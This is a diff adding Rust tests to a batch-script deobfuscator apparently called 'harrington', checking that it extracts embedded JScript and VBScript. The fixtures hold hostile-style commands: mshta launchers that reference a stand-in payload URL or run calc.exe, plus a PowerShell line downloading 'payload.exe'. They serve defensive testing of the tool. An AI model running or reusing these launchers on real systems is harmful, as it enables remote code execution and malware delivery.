@@ -330,6 +330,74 @@ fn deob_writes_extracted_ps1() {
 }
 
 #[test]
+fn deob_writes_extracted_jscript() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        r#"mshta javascript:var u="https://js-payload.example/a.js";close()"#,
+    )
+    .expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("harrington")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+
+    let extracted = fs::read_dir(&out_dir)
+        .expect("read out")
+        .filter_map(|e| e.ok())
+        .find(|e| e.file_name().to_string_lossy().ends_with(".js"))
+        .expect("extracted .js missing");
+    let contents = fs::read_to_string(extracted.path()).expect("read extracted js");
+    assert!(
+        contents.contains("https://js-payload.example/a.js"),
+        "got:\n{}",
+        contents
+    );
+}
+
+#[test]
+fn deob_writes_extracted_vbs() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        r#"mshta vbscript:CreateObject("WScript.Shell").Run("calc.exe"):close"#,
+    )
+    .expect("write");
+    let out_dir = dir.path().join("out");
+    Command::cargo_bin("harrington")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .assert()
+        .success();
+
+    let extracted = fs::read_dir(&out_dir)
+        .expect("read out")
+        .filter_map(|e| e.ok())
+        .find(|e| e.file_name().to_string_lossy().ends_with(".vbs"))
+        .expect("extracted .vbs missing");
+    let contents = fs::read_to_string(extracted.path()).expect("read extracted vbs");
+    assert!(
+        contents.contains("CreateObject") && contents.contains("calc.exe"),
+        "got:\n{}",
+        contents
+    );
+}
+
+#[test]
 fn deob_writes_normalized_ps1_when_readability_improves() {
     use base64::Engine;
     let decoded = "Invoke-WebRequest -Uri 'https://readable.example/payload.exe'";
